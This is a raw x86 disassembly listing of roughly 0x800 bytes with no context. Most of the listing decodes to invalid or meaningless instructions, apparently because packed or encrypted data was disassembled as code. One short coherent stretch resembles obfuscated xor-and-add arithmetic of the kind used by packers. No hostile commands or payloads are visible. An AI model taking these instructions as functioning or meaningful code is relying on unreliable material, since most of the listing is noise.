  416b62:	xchg   DWORD PTR [eax+0x7bb9460],ebp
  416b68:	jle    0x416b37
  416b6a:	rol    dh,cl
  416b6c:	nop
  416b6d:	call   0x8e92:0xff1eb42a
  416b74:	push   esp
  416b75:	loopne 0x416b82
  416b77:	cmp    bl,BYTE PTR [eax+ecx*4+0x1f]
  416b7b:	cmc    
  416b7c:	push   ds
  416b7d:	clc    
  416b7e:	cmp    al,0x70
  416b80:	aad    0xc5
  416b82:	xchg   esp,eax
  416b83:	push   eax
  416b84:	dec    edx
  416b85:	(bad)  
  416b86:	stc    
  416b87:	es push edx
  416b89:	and    eax,DWORD PTR [esp+eax*2]
  416b8c:	sbb    eax,0x2921f16a
  416b91:	dec    ebx
  416b92:	jnp    0x416c11
  416b94:	fcomp  QWORD PTR [edx-0x6d]
  416b97:	jp     0x416b6e
  416b99:	hlt    
  416b9a:	lods   eax,DWORD PTR ds:[esi]
  416b9b:	shl    DWORD PTR cs:[edi+0x44],1
  416b9f:	push   0x2c0d10f
  416ba4:	push   edx
  416ba5:	in     al,0xc
  416ba7:	and    DWORD PTR [ebp-0x7a7c760b],ecx
  416bad:	add    eax,0x475f07db
  416bb2:	dec    esi
  416bb3:	sbb    DWORD PTR [esi-0x638ff27c],ebp
  416bb9:	xchg   BYTE PTR [ebx+0x40b45179],ah
  416bbf:	sub    edi,0xa008054b
  416bc5:	fidiv  DWORD PTR [ebx+0x5d]
  416bc8:	inc    ecx
  416bc9:	icebp  
  416bca:	(bad)  
  416bcb:	push   edx
  416bcc:	inc    eax
  416bcd:	pop    ebp
  416bce:	add    DWORD PTR [ecx+eax*1+0x5c3203b9],edx
  416bd5:	push   cs
  416bd6:	in     eax,dx
  416bd7:	inc    esi
  416bd8:	retf   0x28ec
  416bdb:	test   edx,ebp
  416bdd:	je     0x416b74
  416bdf:	(bad)  
  416be0:	outs   dx,BYTE PTR ds:[esi]
  416be1:	mov    dh,0xea
  416be3:	ins    DWORD PTR es:[edi],dx
  416be4:	repnz sub bh,dh
  416be7:	sub    ch,bh
  416be9:	scas   al,BYTE PTR es:[edi]
  416bea:	les    eax,FWORD PTR [esi+0x2b]
  416bed:	xor    ebp,DWORD PTR [ebx+0x1e86ae8a]
  416bf3:	sub    al,0x73
  416bf5:	lods   eax,DWORD PTR ds:[esi]
  416bf6:	stos   DWORD PTR es:[edi],eax
  416bf7:	and    eax,0xd445a778
  416bfc:	push   edi
  416bfd:	loope  0x416c26
  416bff:	and    al,0x28
  416c01:	imul   ebp,DWORD PTR [edi],0x62e25f12
  416c07:	jno    0x416c51
  416c09:	jb     0x416bd1
  416c0b:	xlat   BYTE PTR ds:[ebx]
  416c0c:	ret    0xe9d3
  416c0f:	scas   eax,DWORD PTR es:[edi]
  416c10:	and    eax,DWORD PTR [edi]
  416c12:	call   FWORD PTR [edi]
  416c14:	fdiv   QWORD PTR [edx+0x79]
  416c17:	shl    esi,1
  416c19:	test   bh,0x80
  416c1c:	sbb    BYTE PTR [ebx-0x14],0x54
  416c20:	shr    DWORD PTR [ecx],0x92
  416c23:	pushf  
  416c24:	and    al,0xe0
  416c26:	fnstsw WORD PTR [edi-0x76]
  416c29:	lods   eax,DWORD PTR ds:[esi]
  416c2a:	(bad)  
  416c2c:	(bad)  
  416c2d:	jle    0x416bca
  416c2f:	es mov edi,0x77344da3
  416c35:	cmp    eax,DWORD PTR [eax+eiz*2+0x470802f2]
  416c3c:	jnp    0x416c42
  416c3e:	xchg   edi,eax
  416c3f:	cmp    edx,eax
  416c41:	pop    esp
  416c42:	lahf   
  416c43:	add    al,0xca
  416c45:	hlt    
  416c46:	sub    BYTE PTR [edi-0x6c],bh
  416c49:	dec    ebx
  416c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c4b:	fdivr  DWORD PTR [ecx]
  416c4d:	pop    ecx
  416c4e:	inc    esp
  416c4f:	ins    BYTE PTR es:[edi],dx
  416c50:	or     edi,ebx
  416c52:	sub    dh,bl
  416c54:	cmp    eax,0x62b2d595
  416c59:	icebp  
  416c5a:	rol    BYTE PTR [edi-0x51],0xf1
  416c5e:	test   BYTE PTR [esi+0x32],dl
  416c61:	das    
  416c62:	and    eax,0x7fede69f
  416c67:	mov    cl,0xef
  416c69:	or     DWORD PTR [eax+0x53],eax
  416c6c:	lods   al,BYTE PTR ds:[esi]
  416c6d:	push   cs
  416c6e:	daa    
  416c6f:	neg    BYTE PTR [ecx-0x38]
  416c72:	enter  0x836e,0xd4
  416c76:	adc    al,0xd6
  416c78:	cmp    bl,BYTE PTR [edx]
  416c7a:	retf   0x3527
  416c7d:	jmp    0x6478c79c
  416c82:	ins    DWORD PTR es:[edi],dx
  416c83:	mov    WORD PTR [edi-0x68a8630d],ss
  416c89:	or     eax,0xf9e71ded
  416c8e:	add    BYTE PTR [eax+0x7b3c33c5],al
  416c94:	sti    
  416c95:	shl    BYTE PTR [esi-0x5a48676c],cl
  416c9b:	push   cs
  416c9c:	shr    bh,1
  416c9e:	call   0x44c95883
  416ca3:	aad    0xfe
  416ca5:	lock xor DWORD PTR gs:[eax+0x4a0e39fc],0x78
  416cae:	sub    eax,0xd8166039
  416cb3:	jl     0x416c87
  416cb5:	cmp    DWORD PTR [edi],esp
  416cb7:	mov    edi,0xa29b283d
  416cbc:	pusha  
  416cbd:	clc    
  416cbe:	push   esi
  416cbf:	xchg   cl,al
  416cc1:	pusha  
  416cc2:	(bad)  
  416cc3:	sbb    BYTE PTR [edi+0x13],al
  416cc6:	dec    ecx
  416cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cc8:	shl    DWORD PTR [ebx],cl
  416cca:	daa    
  416ccb:	or     BYTE PTR [esi-0x17],0xa4
  416ccf:	cwde   
  416cd0:	bound  ebp,QWORD PTR [esi]
  416cd2:	jns    0x416cd1
  416cd4:	and    al,ch
  416cd6:	sub    DWORD PTR [ebp-0x21903c4d],ebp
  416cdc:	std    
  416cdd:	fidivr DWORD PTR [eax+0x8504b9f]
  416ce3:	mov    al,0x16
  416ce5:	xor    edx,edx
  416ce7:	daa    
  416ce8:	daa    
  416ce9:	rcl    DWORD PTR [edx-0x361197ca],cl
  416cef:	out    0x33,al
  416cf1:	or     DWORD PTR [edx],ebp
  416cf3:	inc    edx
  416cf4:	outs   dx,BYTE PTR ds:[esi]
  416cf5:	push   0xffffffcd
  416cf7:	or     DWORD PTR [esi+0x4b],ebp
  416cfa:	fdiv   QWORD PTR [ebp+edi*1-0x664cc5ee]
  416d01:	pop    esp
  416d02:	or     eax,ecx
  416d04:	push   esi
  416d05:	ror    BYTE PTR [edi-0x7b],cl
  416d08:	arpl   WORD PTR [ebx+0x6b05b260],ax
  416d0e:	inc    esi
  416d0f:	rcr    cl,cl
  416d11:	rcr    BYTE PTR [edx],0x70
  416d14:	sbb    al,0xe6
  416d16:	lds    esp,FWORD PTR [esp+0x59]
  416d1a:	add    bh,al
  416d1c:	popa   
  416d1d:	into   
  416d1e:	mov    esp,0x4d5ada85
  416d23:	das    
  416d24:	jmp    0xeb5c4c9d
  416d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d2a:	adc    al,0x6a
  416d2c:	jge    0x416d6f
  416d2e:	mov    ds:0xb8e5287b,eax
  416d33:	jns    0x416cde
  416d35:	pop    ebp
  416d36:	mov    edi,0x6c30d66b
  416d3b:	xor    al,0xe0
  416d3d:	lahf   
  416d3e:	adc    eax,0x123104b8
  416d43:	and    bl,BYTE PTR fs:[edi]
  416d46:	ss daa 
  416d48:	sar    DWORD PTR [ecx+0x44295f01],0x7d
  416d4f:	cmp    ebx,DWORD PTR [ebx+0x17]
  416d52:	stos   DWORD PTR es:[edi],eax
  416d53:	mov    ebp,0x2d3e7463
  416d58:	addr16 in eax,dx
  416d5a:	and    eax,0xc06e634
  416d5f:	fst    QWORD PTR [edi]
  416d61:	(bad)  
  416d62:	jmp    0x416d80
  416d64:	pop    ecx
  416d65:	(bad)  
  416d66:	mov    ah,0xc8
  416d68:	xchg   edi,eax
  416d69:	jge    0x416dbc
  416d6b:	lock and dl,al
  416d6e:	(bad)  
  416d6f:	out    0x6,al
  416d71:	xor    eax,0xb165f76c
  416d76:	and    al,BYTE PTR [edx+0x40980274]
  416d7c:	fldenv ds:[edx+0x1857eee3]
  416d83:	(bad)  
  416d84:	mov    ebp,0x541d9e7d
  416d89:	lods   eax,DWORD PTR ds:[esi]
  416d8a:	std    
  416d8b:	in     al,dx
  416d8c:	sbb    DWORD PTR [edx],ebx
  416d8e:	pop    esp
  416d8f:	or     BYTE PTR [ecx],cl
  416d91:	pop    esi
  416d92:	cli    
  416d93:	ror    DWORD PTR [ecx+0x38],1
  416d96:	por    mm0,QWORD PTR [eax+0x19]
  416d9a:	addr16 ret 
  416d9c:	sahf   
  416d9d:	add    bh,dl
  416d9f:	jge    0x416ded
  416da1:	jecxz  0x416dc9
  416da3:	int3   
  416da4:	dec    esi
  416da5:	cmp    DWORD PTR [ebx],0x246e6d1e
  416dab:	push   0x13
  416dad:	mov    esi,0x6858b37f
  416db2:	jbe    0x416d65
  416db4:	and    eax,0xa55f93a3
  416db9:	push   0x67e2c1f5
  416dbe:	add    DWORD PTR [ebx],esi
  416dc0:	call   0xc999:0xb04db825
  416dc7:	mov    es,WORD PTR [edx]
  416dc9:	xor    BYTE PTR [edi-0x218f5278],ah
  416dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dd0:	or     al,0x92
  416dd2:	maxps  xmm0,XMMWORD PTR [eax-0x2f865004]
  416dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dda:	sbb    BYTE PTR [ecx],bh
  416ddc:	push   eax
  416ddd:	sbb    DWORD PTR [ebx+edx*1],edx
  416de0:	xor    eax,0x9299f13a
  416de5:	and    BYTE PTR [ebx+0x36],ch
  416de8:	add    DWORD PTR [esi+0x5db72a9d],eax
  416dee:	xor    edx,esi
  416df0:	add    eax,edi
  416df2:	add    edx,edi
  416df4:	imul   eax,edx
  416df7:	add    eax,DWORD PTR [ebp-0xc]
  416dfa:	mov    DWORD PTR [ebp-0xc],eax
  416dfd:	mov    eax,DWORD PTR [ebp-0xc]
  416e00:	mov    edx,DWORD PTR [ebp-0x20]
  416e03:	sub    eax,edi
  416e05:	sub    edx,edi
  416e07:	xor    eax,esi
  416e09:	xor    edx,esi
  416e0b:	cmp    edx,eax
  416e0d:	jne    0x4102d1
  416e13:	mov    eax,DWORD PTR [ebp-0x1c]
  416e16:	mov    edx,DWORD PTR [ebp-0x20]
  416e19:	xor    eax,esi
  416e1b:	add    eax,edi
  416e1d:	imul   eax,edx
  416e20:	mov    edx,DWORD PTR [ebp-0x24]
  416e23:	xor    edx,esi
  416e25:	add    edx,edi
  416e27:	or     eax,edx
  416e29:	mov    edx,DWORD PTR [ebp-0x18]
  416e2c:	xor    edx,esi
  416e2e:	add    eax,edx
  416e30:	mov    edx,DWORD PTR [ebp-0x18]
  416e33:	xor    edx,esi
  416e35:	add    eax,edx
  416e37:	mov    edx,DWORD PTR [ebp-0x10]
  416e3a:	lea    eax,[eax+edx*1+0x64e5b6]
  416e41:	jmp    0x4191ca
  416e46:	jmp    0x4191bb
  416e4b:	push   ebx
  416e4c:	ja     0x416e99
  416e4e:	cmp    BYTE PTR [ebx],ch
  416e50:	add    al,0xe3
  416e52:	adc    esp,ebp
  416e54:	xchg   edx,eax
  416e55:	push   edx
  416e56:	mov    al,0x62
  416e58:	xchg   edi,eax
  416e59:	inc    edi
  416e5a:	mov    bl,0xb7
  416e5c:	and    al,0x61
  416e5e:	bound  ecx,QWORD PTR [edx]
  416e60:	pop    edi
  416e61:	bound  esp,QWORD PTR [edx-0x52]
  416e64:	(bad)  
  416e65:	adc    ah,BYTE PTR [ebp-0x2ba3b55f]
  416e6b:	retf   
  416e6c:	fs hlt 
  416e6e:	push   edi
  416e6f:	inc    esi
  416e70:	inc    edi
  416e71:	in     eax,dx
  416e72:	xor    bl,BYTE PTR ss:[esi+0x7343e977]
  416e79:	lahf   
  416e7a:	fcomp  QWORD PTR [eax+0x15542729]
  416e80:	and    BYTE PTR [eax-0x79],cl
  416e83:	or     BYTE PTR [eax+0x1b],0xd
  416e87:	sub    eax,0xfb1e2dab
  416e8d:	ja     0x416e80
  416e8f:	and    al,0xbb
  416e91:	sar    DWORD PTR [edx],cl
  416e93:	mov    eax,ds:0x926c0d1a
  416e98:	dec    edi
  416e99:	xchg   esi,eax
  416e9a:	or     BYTE PTR [ebx+edx*8],al
  416e9d:	jo     0x416f15
  416e9f:	sub    eax,DWORD PTR [ecx]
  416ea1:	mov    al,BYTE PTR fs:[edx]
  416ea4:	inc    edx
  416ea5:	cmp    BYTE PTR [edx],bl
  416ea7:	push   ebx
  416ea8:	push   eax
  416ea9:	or     eax,0x760442ec
  416eae:	in     eax,dx
  416eaf:	dec    ebx
  416eb0:	aaa    
  416eb1:	fnstcw WORD PTR [ebx]
  416eb3:	dec    ebp
  416eb4:	mov    bl,0xb9
  416eb6:	aam    0xe5
  416eb8:	or     BYTE PTR [eax-0x25],dh
  416ebb:	aam    0x53
  416ebd:	scas   eax,DWORD PTR es:[edi]
  416ebe:	pop    esi
  416ebf:	adc    BYTE PTR [ebx+0x41],ch
  416ec2:	popa   
  416ec3:	and    eax,0x55a29273
  416ec8:	sbb    edx,DWORD PTR [ebx+0x7e379a9]
  416ece:	xor    DWORD PTR [eax],0xffffffc3
  416ed1:	or     al,0xad
  416ed3:	xchg   esp,eax
  416ed4:	mov    al,0x11
  416ed6:	inc    ebx
  416ed7:	rcr    DWORD PTR gs:[edx],1
  416eda:	inc    eax
  416edb:	push   ss
  416edc:	pushf  
  416edd:	cmpxchg DWORD PTR [ecx+0x68],esp
  416ee1:	mov    es,WORD PTR [esi]
  416ee3:	dec    ecx
  416ee4:	fwait
  416ee5:	enter  0x3b,0xb9
  416ee9:	stc    
  416eea:	mov    esi,0x5360404d
  416eef:	xchg   ebp,eax
  416ef0:	xchg   edi,eax
  416ef1:	mov    ebp,0xde4a97df
  416ef6:	ret    
  416ef7:	ror    BYTE PTR es:[ebx-0x22],cl
  416efb:	jmp    0x416f53
  416efd:	mov    dh,0x40
  416eff:	(bad)  
  416f01:	inc    esi
  416f02:	std    
  416f03:	sbb    al,0x54
  416f05:	push   edx
  416f06:	cdq    
  416f07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f08:	xchg   ebx,eax
  416f09:	jl     0x416ee5
  416f0b:	shl    DWORD PTR [esi+edx*8],0xeb
  416f0f:	add    BYTE PTR [edx],dl
  416f11:	xchg   DWORD PTR [esi+0x1e5ffcd8],eax
  416f17:	ins    BYTE PTR es:[edi],dx
  416f18:	mul    BYTE PTR [esi-0x20db0e0]
  416f1e:	(bad)  
  416f1f:	fdivr  QWORD PTR [ecx-0x29043762]
  416f25:	jge    0x416f17
  416f27:	xchg   edi,eax
  416f28:	dec    esp
  416f29:	push   cs
  416f2a:	add    DWORD PTR [esi],esi
  416f2c:	jmp    0xc670:0x729b564f
  416f33:	or     al,0xa8
  416f35:	aaa    
  416f36:	fcomp  QWORD PTR [edx+0x5ce8160]
  416f3c:	mov    esp,0xc14d6f24
  416f41:	mov    ecx,0xcd2f25d9
  416f46:	mov    ebx,0x45f76c70
  416f4b:	sub    BYTE PTR [eax-0x7820f2b8],dh
  416f51:	jnp    0x416f5a
  416f53:	popf   
  416f54:	sub    al,0xd
  416f56:	pop    edi
  416f57:	jl     0x416f22
  416f59:	mov    dh,0x8b
  416f5b:	add    dh,cl
  416f5d:	test   eax,0xda1e420e
  416f62:	out    0x8b,al
  416f64:	rcr    BYTE PTR [ebx+0x34],cl
  416f67:	sub    al,0xf6
  416f69:	inc    edi
  416f6a:	shr    BYTE PTR [edx-0x33a887d1],1
  416f70:	mov    eax,0x40f4915b
  416f75:	or     eax,0xb04827cc
  416f7a:	inc    ebx
  416f7b:	cwde   
  416f7c:	push   ds
  416f7d:	out    0x4b,eax
  416f7f:	inc    esp
  416f80:	push   esi
  416f81:	dec    esp
  416f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f83:	jbe    0x416f62
  416f85:	xor    eax,0x92dabae4
  416f8a:	pop    es
  416f8b:	nop
  416f8c:	push   ds
  416f8d:	xor    DWORD PTR [ecx-0x47],ebx
  416f90:	mov    bl,0x6b
  416f92:	loope  0x416fef
  416f94:	jbe    0x417009
  416f96:	(bad)  
  416f97:	imul   esp,DWORD PTR [ecx+0x45e7e52e],0xfffffff2
  416f9e:	ret    0xd6ae
  416fa1:	xor    al,0xa6
  416fa3:	adc    ah,BYTE PTR [ebp+eiz*8+0x31]
  416fa7:	inc    di
  416fa9:	and    DWORD PTR [ebx],0x74
  416fac:	sahf   
  416fad:	pop    ebx
  416fae:	pushf  
  416faf:	xor    al,0x8b
  416fb1:	push   cs
  416fb2:	sahf   
  416fb3:	push   0x10b2199e
  416fb8:	lock lea ecx,[edx+0x52]
  416fbc:	loope  0x417010
  416fbe:	jmp    0x416f81
  416fc0:	sbb    edi,DWORD PTR [esi]
  416fc2:	cmp    BYTE PTR [esi-0xd0fd669],cl
  416fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fc9:	jne    0x417029
  416fcb:	fadd   DWORD PTR [ebx-0x1d]
  416fce:	xor    edx,esp
  416fd0:	add    dh,BYTE PTR [eax+0x51416059]
  416fd6:	sahf   
  416fd7:	xchg   edx,eax
  416fd8:	or     ecx,DWORD PTR gs:[ecx-0x6cdaa549]
  416fdf:	push   edi
  416fe0:	lods   eax,DWORD PTR ds:[esi]
  416fe1:	pop    ebx
  416fe2:	pushf  
  416fe3:	add    eax,0xab2e267c
  416fe8:	cmp    al,0xd0
  416fea:	xchg   edx,eax
  416feb:	mov    BYTE PTR [eax-0x3],cl
  416fee:	xchg   esp,eax
  416fef:	imul   esp,DWORD PTR ds:0xf231b29c,0xffffff8d
  416ff6:	imul   edx,DWORD PTR [ebx+0x358e0305],0xfffffff1
  416ffd:	enter  0xcac7,0xe8
  417001:	mov    bh,0x41
  417003:	arpl   WORD PTR [ecx-0x6ca94359],bp
  417009:	ss xchg edi,eax
  41700b:	sbb    al,0x2b
  41700d:	ret    
  41700e:	adc    al,BYTE PTR [esi+eiz*4+0x2612ec9b]
  417015:	emms   
  417017:	ins    DWORD PTR es:[edi],dx
  417018:	or     DWORD PTR [edx-0x33],ecx
  41701b:	js     0x416ff5
  41701d:	jnp    0x41702a
  41701f:	ins    BYTE PTR es:[edi],dx
  417020:	push   ds
  417021:	mov    dl,0xd5
  417023:	dec    ebx
  417024:	aam    0x14
  417026:	mov    ebx,0x4e5b8a40
  41702b:	shl    ecx,0x9b
  41702e:	and    edi,DWORD PTR [eax-0x51]
  417031:	shl    BYTE PTR [ebp+0x7d],1
  417034:	and    ch,BYTE PTR ds:0x205f1a9a
  41703a:	sbb    ch,ah
  41703c:	push   eax
  41703d:	sbb    ebp,DWORD PTR [esp+ebx*4]
  417040:	popf   
  417041:	(bad)  
  417042:	push   ss
  417043:	jo     0x417007
  417045:	into   
  417046:	add    edi,DWORD PTR [edx+0x90fbe27]
  41704c:	fdivr  QWORD PTR [ecx+edx*1-0x54534316]
  417053:	xlat   BYTE PTR ds:[ebx]
  417054:	repnz push edx
  417056:	add    cl,BYTE PTR [ecx]
  417058:	sbb    bl,BYTE PTR [edx]
  41705a:	out    0x95,al
  41705c:	popf   
  41705d:	ins    BYTE PTR es:[edi],dx
  41705e:	je     0x417060
  417060:	mov    al,0xb2
  417062:	dec    edi
  417063:	mov    bl,dh
  417065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417066:	inc    edx
  417067:	fisttp WORD PTR [esi+0x6ae526ee]
  41706d:	push   eax
  41706e:	or     BYTE PTR [ebp-0x6c],ch
  417071:	jbe    0x417013
  417073:	jns    0x417068
  417075:	imul   ecx,DWORD PTR [ecx],0xedb7287f
  41707b:	aas    
  41707c:	sub    al,0x2a
  41707e:	clc    
  41707f:	xor    al,0x95
  417081:	loopne 0x417051
  417083:	add    al,0x4
  417085:	pop    esp
  417086:	psubq  mm0,QWORD PTR [ebx+eiz*8-0x74dcaec4]
  41708e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41708f:	and    DWORD PTR [edi+0x72],eax
  417092:	fimul  DWORD PTR [ebx-0x6c]
  417095:	mov    edi,0x49fca089
  41709a:	pop    ss
  41709b:	jo     0x41705a
  41709d:	jmp    FWORD PTR [edi]
  41709f:	les    edi,FWORD PTR [eax-0x12]
  4170a2:	pop    es
  4170a3:	mov    cl,0x11
  4170a5:	fidivr DWORD PTR [edi-0x57332e4]
  4170ab:	push   ss
  4170ac:	test   al,0xef
  4170ae:	jle    0x417063
  4170b0:	add    BYTE PTR [edx],0x84
  4170b3:	jne    0x4170de
  4170b5:	in     al,dx
  4170b6:	fwait
  4170b7:	mov    BYTE PTR [edi-0x56],al
  4170ba:	inc    esi
  4170bb:	sahf   
  4170bc:	loop   0x417081
  4170be:	inc    ebp
  4170bf:	jnp    0x417107
  4170c1:	jno    0x41708e
  4170c3:	and    edx,DWORD PTR [ebx+0x26]
  4170c6:	inc    eax
  4170c7:	bound  ecx,QWORD PTR ds:0xebfdac07
  4170cd:	jno    0x41713e
  4170cf:	leave  
  4170d0:	je     0x41710a
  4170d2:	cld    
  4170d3:	nop
  4170d4:	lahf   
  4170d5:	jl     0x4170db
  4170d7:	std    
  4170d8:	adc    esi,DWORD PTR [edx+0x4a]
  4170db:	enter  0xc9ab,0xbf
  4170df:	les    ebx,FWORD PTR [edi-0x42]
  4170e2:	sub    BYTE PTR [edi-0x60],ch
  4170e5:	jg     0x417075
  4170e7:	push   ebx
  4170e8:	fcom   DWORD PTR [ecx]
  4170ea:	push   edx
  4170eb:	or     al,0x5e
  4170ed:	sbb    al,0xf2
  4170ef:	jmp    0xddbee777
  4170f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170f5:	retf   0xdc4b
  4170f8:	mov    WORD PTR [ebp-0x9e272f],?
  4170fe:	and    dl,dl
  417100:	mov    ds:0xe625b4cf,al
  417105:	push   0xffffffaf
  417107:	sbb    eax,0x33ff9742
  41710c:	dec    esi
  41710d:	jmp    DWORD PTR [esi-0x1e]
  417110:	sub    DWORD PTR ds:0x53fbc146,edx
  417116:	jns    0x417194
  417118:	stos   BYTE PTR es:[edi],al
  417119:	cmc    
  41711a:	mov    ds:0xe72ae704,eax
  41711f:	push   eax
  417120:	push   ss
  417121:	outs   dx,DWORD PTR ds:[esi]
  417122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417123:	int3   
  417124:	mov    gs:0x7d3b9e20,al
  41712a:	cwde   
  41712b:	mov    al,0x70
  41712d:	lock cmp eax,0x7e65574b
  417133:	sub    eax,0x8f0a53cd
  417138:	loopne 0x4171b4
  41713a:	idiv   DWORD PTR [edx]
  41713c:	sbb    DWORD PTR [ebx+eiz*1],ecx
  41713f:	aaa    
  417140:	aam    0x2b
  417142:	adc    dl,al
  417144:	inc    ecx
  417145:	nop
  417146:	mov    bh,0x1
  417148:	or     BYTE PTR [edi+0x646f8a55],ch
  41714e:	fiadd  DWORD PTR [ebx+0x43]
  417151:	pop    ebp
  417152:	sub    al,0xa0
  417154:	test   BYTE PTR [ebx+0x28209906],ch
  41715a:	(bad)  
  41715b:	cmp    al,BYTE PTR [esi]
  41715d:	sbb    ah,BYTE PTR [edi+edx*8+0x1d6e857a]
  417164:	pop    es
  417165:	xchg   esp,eax
  417166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417167:	retf   0x3a6d
  41716a:	arpl   WORD PTR [edi-0x446fdb71],bx
  417170:	xchg   ebx,eax
  417171:	stos   DWORD PTR es:[edi],eax
  417172:	scas   al,BYTE PTR es:[edi]
  417173:	retf   0x929e
  417176:	test   eax,0xa2650b44
  41717b:	jne    0x4171ce
  41717d:	xchg   esi,eax
  41717e:	bnd call 0x8977815f
  417184:	adc    BYTE PTR [edx+0x3b],cl
  417187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417188:	jle    0x417180
  41718a:	(bad)  
  41718b:	fs ins DWORD PTR es:[edi],dx
  41718d:	and    DWORD PTR [ecx+0x56f77106],eax
  417193:	cs jbe 0x4171b8
  417196:	neg    DWORD PTR [edx]
  417198:	xor    al,al
  41719a:	add    BYTE PTR [ebp+0xd],bh
  41719d:	or     ch,BYTE PTR [edi+0x79b66b71]
  4171a3:	inc    esp
  4171a4:	mov    ch,0xe8
  4171a6:	ins    BYTE PTR es:[edi],dx
  4171a7:	mov    ds:0xc8bcf8cf,eax
  4171ac:	add    al,0x16
  4171ae:	dec    esp
  4171af:	sub    al,0x21
  4171b1:	xor    al,0x57
  4171b3:	popa   
  4171b4:	(bad)  
  4171b5:	fadd   st,st(0)
  4171b7:	(bad)  
  4171b8:	mov    eax,DWORD PTR [edx]
  4171ba:	adc    al,0x47
  4171bc:	push   cs
  4171bd:	retf   
  4171be:	xor    edx,DWORD PTR [esi]
  4171c0:	stos   DWORD PTR es:[edi],eax
  4171c1:	test   al,0xb3
  4171c3:	sbb    al,0x51
  4171c5:	jle    0x41721d
  4171c7:	in     eax,0xc0
  4171c9:	jmp    0x417154
  4171cb:	aam    0x9b
  4171cd:	cmp    esp,eax
  4171cf:	jo     0x4171dd
  4171d1:	arpl   WORD PTR [ebp+0x49],cx
  4171d4:	adc    eax,0xc35f4a58
  4171d9:	ret    0x59da
  4171dc:	daa    
  4171dd:	imul   eax,DWORD PTR [edx+edx*4+0x59],0x25ab5e15
  4171e5:	jg     0x41721f
  4171e7:	sbb    bl,ch
  4171e9:	ror    BYTE PTR [esi-0x64a13815],1
  4171ef:	mov    ch,0x50
  4171f1:	fst    QWORD PTR [esi]
  4171f3:	adc    esi,DWORD PTR es:[ebx-0x6a]
  4171f7:	repz cmovbe esi,DWORD PTR [edi+0x582fe894]
  4171ff:	lahf   
  417200:	inc    eax
  417201:	add    DWORD PTR [ebp-0x222da4fd],0xffffffa7
  417208:	cmp    al,0x61
  41720a:	push   0xffffffca
  41720c:	jge    0x4171f4
  41720e:	xchg   ebx,eax
  41720f:	push   edi
  417210:	leave  
  417211:	repz jns 0x4171b3
  417214:	stc    
  417215:	push   ss
  417216:	repnz (bad) 
  417218:	clc    
  417219:	mov    edx,0xe2f4991e
  41721e:	jbe    0x4171ef
  417220:	xchg   edi,eax
  417221:	out    dx,al
  417222:	and    al,0xd4
  417224:	push   esp
  417225:	xchg   ebp,eax
  417226:	mov    ds:0x288253ba,eax
  41722b:	mov    eax,0xaab75486
  417230:	cmp    esp,DWORD PTR [ebx+0x67268ed6]
  417236:	pushf  
  417237:	inc    ecx
  417238:	dec    ebx
  417239:	push   ebp
  41723a:	sub    BYTE PTR [ebx-0x74],dl
  41723d:	xor    eax,0xa00a26d8
  417242:	push   eax
  417243:	ret    
  417244:	mov    eax,ss:0x3ecb0367
  41724a:	dec    ebp
  41724b:	cmp    BYTE PTR [ebx+0x1fbac166],cl
  417251:	jp     0x41720c
  417253:	sti    
  417254:	femms  
  417256:	jbe    0x417248
  417258:	lods   eax,DWORD PTR ds:[esi]
  417259:	jp     0x41721b
  41725b:	jge    0x4172c7
  41725d:	stc    
  41725e:	mov    esp,0xbeca05ef
  417263:	call   0x2f895b64
  417268:	test   eax,0x289ee15d
  41726d:	loopne 0x4172ed
  41726f:	mov    eax,ds:0x67bd8e
  417274:	fbld   TBYTE PTR [ebp-0x2a]
  417277:	out    dx,eax
  417278:	test   eax,0x11f9dc57
  41727d:	rol    BYTE PTR [ecx-0xc],cl
  417280:	mov    ecx,DWORD PTR [edx]
  417282:	push   ss
  417283:	add    eax,0xcf17ffd4
  417288:	jmp    0x615a6130
  41728d:	mov    ecx,DWORD PTR [edi+0x324395c6]
  417293:	out    dx,eax
  417294:	icebp  
  417295:	stos   BYTE PTR es:[edi],al
  417296:	sbb    eax,edi
  417298:	xchg   ecx,eax
  417299:	call   FWORD PTR [eax-0x3f]
  41729c:	cmp    DWORD PTR [edi],0xf48f4a05
  4172a2:	mov    al,0x31
  4172a4:	retf   
  4172a5:	add    ah,BYTE PTR [esi-0x53]
  4172a8:	push   cs
  4172a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172aa:	pandn  mm3,QWORD PTR [ebp-0x32]
  4172ae:	dec    esp
  4172af:	fstp   QWORD PTR [esi]
  4172b1:	or     eax,0x213a1d3f
  4172b6:	push   0x85f9885
  4172bb:	pop    edi
  4172bc:	arpl   WORD PTR [esi+edi*1+0x352d7fe7],cx
  4172c3:	aaa    
  4172c4:	call   0xc772d04c
  4172c9:	dec    ebp
  4172ca:	jnp    0x4172fa
  4172cc:	int    0x22
  4172ce:	jae    0x417305
  4172d0:	leave  
  4172d1:	nop
  4172d2:	add    DWORD PTR ds:0x998f0551,ecx
  4172d8:	lds    eax,FWORD PTR [esi-0x66]
  4172db:	push   eax
  4172dc:	mov    ebp,0x11382725
  4172e1:	cmp    BYTE PTR gs:[ecx+0x17ad069b],ah
  4172e8:	(bad)  
  4172e9:	cmp    eax,0xe3c53d0e
  4172ee:	pusha  
  4172ef:	in     eax,0x47
  4172f1:	sbb    bh,BYTE PTR [edx-0x35]
  4172f4:	fldenv [ebp+0x45]
  4172f7:	sar    BYTE PTR [edx-0x4a],0xc7
  4172fb:	fld    QWORD PTR ds:0x93f411fd
  417301:	push   eax
  417302:	clc    
  417303:	imul   ecx,ebx,0xffffff8f
  417306:	cld    
  417307:	inc    esp
  417308:	push   es
  417309:	xor    ebx,DWORD PTR [esi+0x2]
  41730c:	dec    ebp
